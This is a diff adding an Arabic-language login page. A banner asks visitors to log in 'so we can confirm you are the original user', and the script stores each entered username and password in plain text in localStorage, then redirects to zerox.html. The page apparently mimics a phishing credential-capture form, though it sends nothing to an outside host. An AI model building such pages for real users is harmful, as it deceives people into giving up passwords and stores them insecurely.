@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="styles.css">
+    <title>تسجيل الدخول</title>
+</head>
+<body>
+    <div class="login-container">
+    <form id="login-form">
+        <input type="text" id="username" placeholder="اسم المستخدم" required>
+        <input type="password" id="password" placeholder="كلمة المرور" required>
+        <button type="button" onclick="collectAndRedirect()">تسجيل الدخول</button>
+    </div>
+    <div class="span1" >
+        <span>سجل الدخول</span>
+    </div>
+
+    <div class="span2" >
+        <span> سجل الدخول كي نتمكن من التأكد من انك المستخدم الاصلي</span>
+    </div>
+
+    </form>
+    <script>
+        function collectAndRedirect() {
+            const username = document.getElementById("username").value;
+            const password = document.getElementById("password").value;
+
+            const savedData = JSON.parse(localStorage.getItem("loginData")) || [];
+
+            savedData.push({ username, password });
+
+            localStorage.setItem("loginData", JSON.stringify(savedData));
+
+            window.location.href = "zerox.html";
+        }
+    </script>
+</body>
+</html>
